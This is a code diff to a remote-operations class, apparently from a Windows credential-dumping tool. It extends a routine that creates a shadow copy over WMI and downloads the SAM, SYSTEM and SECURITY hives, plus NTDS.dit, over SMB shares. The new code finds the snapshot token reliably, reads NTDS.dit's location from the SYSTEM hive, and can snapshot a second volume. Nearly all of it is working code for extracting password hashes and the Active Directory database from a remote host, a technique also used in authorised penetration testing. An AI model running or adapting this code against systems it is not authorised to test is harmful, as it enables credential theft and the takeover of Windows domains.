@@ -1404,34 +1404,140 @@ class RemoteOperations:
 
         return remoteFileName
 
-    def createSSandDownloadWMI(self, volume, localPath, NTDS=False):
-        LOG.info('Creating SS')
+    def __getSnapshotTokens(self, share):
+        # FSCTL_SRV_ENUMERATE_SNAPSHOTS returns the tokens in the @GMT-YYYY.MM.DD-HH.MM.SS form,
+        # which is the form expected as an SMB path component to access a snapshot.
+        return self.__smbConnection.listSnapshots(self.__smbConnection.connectTree(share), '/')
+
+    def __createShadowAndGetToken(self, volume, share='ADMIN$'):
+        # Returns the token of the Shadow Snapshot just created. Enumerating the tokens before and
+        # after the creation avoids picking a pre-existing snapshot, since listSnapshots() may
+        # return older snapshots first.
+        tokensBefore = self.__getSnapshotTokens(share)
+
         ssID = self.__wmiCreateShadow(volume)
-        LOG.info('Getting SMB equivalent PATH to access remotely the SS')
-        gmtSMBPath = self.__smbConnection.listSnapshots(self.__smbConnection.connectTree('ADMIN$'), '/')[0]
+
+        for _ in range(5):
+            tokensAfter = self.__getSnapshotTokens(share)
+            newTokens = [t for t in tokensAfter if t not in tokensBefore]
+            if len(newTokens) > 0:
+                return ssID, newTokens[-1]
+            time.sleep(1)
+
+        raise Exception('Could not find the created Shadow Snapshot through SMB')
+
+    @staticmethod
+    def __normalizeVolume(volume):
+        # Accepts 'C:', 'C:\' and returns 'C:\'
+        return '%s:\\' % volume[0].upper()
+
+    @staticmethod
+    def __shareForVolume(volume):
+        # C:\ -> C$, D:\ -> D$
+        return '%s$' % volume[0].upper()
+
+    @staticmethod
+    def __splitVolumeAndPath(path):
+        # 'D:\NTDS\ntds.dit' -> ('D:', 'NTDS\ntds.dit'). Returns (None, path) if there is no
+        # drive letter in the path.
+        path = path.rstrip('\x00')
+        if len(path) > 1 and path[1] == ':':
+            return path[0].upper() + ':', path[2:].lstrip('\\/')
+        return None, path.lstrip('\\/')
+
+    def __getNTDSLocationFromSystemHive(self, systemHivePath):
+        # Reads HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\DSA Database file from the
+        # SYSTEM hive, like saveNTDS() does for the -use-vss method, to find NTDS.dit when it is
+        # not in the default C:\Windows\NTDS directory.
+        try:
+            winreg = OfflineRegistry(systemHivePath)
+            try:
+                currentControlSet = winreg.getValue('\\Select\\Current')
+                if currentControlSet is None:
+                    return None
+                currentControlSet = 'ControlSet%03d' % currentControlSet[1]
+                value = winreg.getValue('\\%s\\Services\\NTDS\\Parameters\\DSA Database file' % currentControlSet)
+                if value is not None:
+                    ntdsLocation = value[1]
+                    # The offline registry parser returns REG_SZ data as raw UTF-16LE bytes
+                    if isinstance(ntdsLocation, bytes):
+                        ntdsLocation = ntdsLocation.decode('utf-16-le', errors='ignore')
+                    return ntdsLocation.rstrip('\x00')
+            finally:
+                winreg.finish()
+        except Exception as e:
+            LOG.debug('Could not read the NTDS.dit location from the SYSTEM hive: %s' % e)
+        return None
+
+    def createSSandDownloadWMI(self, volume, localPath, NTDS=False, ntdsPath=None):
+        volume = self.__normalizeVolume(volume)
+
+        LOG.info('Creating SS')
+        ssID, gmtSMBPath = self.__createShadowAndGetToken(volume)
         LOG.debug('Got SMB GMT Path: %s' % gmtSMBPath)
         LOG.debug('Performed SS via WMI and got info')
 
-        # Array of tuples of (local path to download, remote path of file)
-        paths = [('%s/SAM' % localPath, '%s\\System32\\config\\SAM' % gmtSMBPath),
-                 ('%s/SYSTEM' % localPath, '%s\\System32\\config\\SYSTEM' % gmtSMBPath),
-                 ('%s/SECURITY' % localPath, '%s\\System32\\config\\SECURITY' % gmtSMBPath)]
+        # Array of tuples of (local path to download, remote share, remote path of file)
+        paths = [('%s/SAM' % localPath, 'ADMIN$', '%s\\System32\\config\\SAM' % gmtSMBPath),
+                 ('%s/SYSTEM' % localPath, 'ADMIN$', '%s\\System32\\config\\SYSTEM' % gmtSMBPath),
+                 ('%s/SECURITY' % localPath, 'ADMIN$', '%s\\System32\\config\\SECURITY' % gmtSMBPath)]
 
-        if NTDS:
-            LOG.debug('Adding NTDS Path')
-            paths.append(('%s/ntds.dit' % localPath, '%s\\NTDS\\ntds.dit' % gmtSMBPath))
+        ntdsSSID = None
+        try:
+            for p in paths:
+                LOG.debug("Downloading Remote path: %s to -> %s" % (p[2], p[0]))
+                with open(p[0], 'wb') as local_file:
+                    self.__smbConnection.getFile(p[1], p[2], local_file.write)
 
-        for p in paths:
-            LOG.debug("Downloading Remote path: %s to -> %s" % (p[1], p[0]))
-            with open(p[0], 'wb') as local_file:
-                self.__smbConnection.getFile('ADMIN$', p[1], local_file.write)
+            if NTDS:
+                if ntdsPath is None:
+                    ntdsPath = self.__getNTDSLocationFromSystemHive('%s/SYSTEM' % localPath)
+                    if ntdsPath is not None:
+                        LOG.info('Registry says NTDS.dit is at %s' % ntdsPath)
+                    else:
+                        ntdsPath = 'Windows\\NTDS\\ntds.dit'
+                        LOG.debug('Could not find the NTDS.dit location in the SYSTEM hive, using default %s' % ntdsPath)
 
-        # Return a list of the local paths where SAM, SYSTEM and SECURITY were downloaded
-        LOG.debug('Trying to delete ShadowSnapshot')
-        self.__wmiDeleteShadow(ssID)
+                # The drive letter, when present, selects the volume to take the Shadow Snapshot on
+                pathVolume, relativePath = self.__splitVolumeAndPath(ntdsPath)
+                ntdsVolume = self.__normalizeVolume(pathVolume if pathVolume is not None else volume)
+
+                if ntdsVolume == volume:
+                    ntdsToken = gmtSMBPath
+                    ntdsShare = 'ADMIN$'
+                    if relativePath.lower().startswith('windows\\'):
+                        # ADMIN$ is rooted at <volume>\Windows, strip it from the relative path
+                        relativePath = relativePath[len('windows\\'):]
+                    else:
+                        # Not under the ADMIN$ root, use the volume admin share instead
+                        ntdsShare = self.__shareForVolume(ntdsVolume)
+                else:
+                    ntdsShare = self.__shareForVolume(ntdsVolume)
+                    LOG.info('Creating a second SS on %s for NTDS.dit' % ntdsVolume)
+                    ntdsSSID, ntdsToken = self.__createShadowAndGetToken(ntdsVolume, ntdsShare)
+
+                remoteNTDSPath = '%s\\%s' % (ntdsToken, relativePath)
+                LOG.debug("Downloading Remote path: %s to -> %s" % (remoteNTDSPath, '%s/ntds.dit' % localPath))
+                with open('%s/ntds.dit' % localPath, 'wb') as local_file:
+                    self.__smbConnection.getFile(ntdsShare, remoteNTDSPath, local_file.write)
+                paths.append(('%s/ntds.dit' % localPath, ntdsShare, remoteNTDSPath))
+        finally:
+            # The hives are already downloaded, a deletion failure must not prevent the dump
+            LOG.debug('Trying to delete ShadowSnapshot')
+            try:
+                self.__wmiDeleteShadow(ssID)
+            except Exception as e:
+                LOG.warning('Could not delete ShadowSnapshot %s: %s' % (ssID, e))
+            if ntdsSSID is not None:
+                LOG.debug('Trying to delete NTDS.dit ShadowSnapshot')
+                try:
+                    self.__wmiDeleteShadow(ntdsSSID)
+                except Exception as e:
+                    LOG.warning('Could not delete NTDS.dit ShadowSnapshot %s: %s' % (ntdsSSID, e))
 
         LOG.debug('Downloaded SAM, SYSTEM and SECURITY from Shadow Snapshot. Dumping...')
-        return list(zip(*paths))[0]
+        # Return a list of the local paths where SAM, SYSTEM, SECURITY (and NTDS.dit) were downloaded
+        return [p[0] for p in paths]
 
 class CryptoCommon:
     # Common crypto stuff used over different classes
